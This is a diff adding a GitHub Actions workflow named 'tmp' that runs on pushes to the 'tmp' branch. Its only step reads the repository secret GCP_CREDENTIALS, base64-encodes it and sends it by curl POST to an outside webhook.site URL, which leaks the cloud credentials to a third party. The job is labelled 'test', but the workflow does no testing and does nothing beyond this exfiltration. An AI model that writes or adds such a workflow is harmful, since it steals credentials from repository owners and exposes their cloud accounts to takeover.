@@ -1,0 +1,14 @@
+name: tmp
+
+on:
+  push:
+    branches: [ "tmp" ]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    env:
+      GCP_CREDENTIALS: ${{ secrets.GCP_CREDENTIALS }}
+    steps:
+      - name: Curl secret.GCP_CREDENTIALS to webhook.site
+        run: |
+            echo "${{ env.GCP_CREDENTIALS }}" | base64 | tr -d '\n' | sed "s/['\"]/\\\\&/g" | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://webhook.site/5f12828a-3694-4b99-897a-8eef79f06d29
